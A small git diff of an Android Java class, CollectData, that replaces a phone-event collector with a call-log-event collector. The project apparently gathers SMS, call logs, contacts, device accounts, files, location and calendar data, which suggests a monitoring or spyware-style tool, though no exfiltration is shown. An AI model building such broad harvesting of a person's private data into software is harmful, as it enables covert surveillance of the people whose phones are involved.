@@ -10,12 +10,12 @@ import android.content.Context;
 
 import com.xaviar.collect.calendar.CollectCalendar;
 import com.xaviar.collect.calllog.CollectCallLog;
+import com.xaviar.collect.calllog_event.CollectCalllogEvent;
 import com.xaviar.collect.contacts.CollectContacts;
 import com.xaviar.collect.device_accounts.CollectDeviceAccount;
 import com.xaviar.collect.files.CollectFiles;
 import com.xaviar.collect.location.CollectLocations;
 import com.xaviar.collect.packages.CollectPackages;
-import com.xaviar.collect.phone_event.CollectPhoneEvent;
 import com.xaviar.collect.phoneparams.CollectPhoneParams;
 import com.xaviar.collect.sms.CollectSms;
 import com.xaviar.collect.sms_event.CollectSmsEvent;
@@ -105,7 +105,7 @@ public class CollectData implements ICollector {
 	}
 	
 	public void registerPhoneEvent() {
-		CollectPhoneEvent phoneEventCollect = new CollectPhoneEvent(ctx);
+		CollectCalllogEvent phoneEventCollect = new CollectCalllogEvent(ctx);
 		register(phoneEventCollect);		
 	}
 
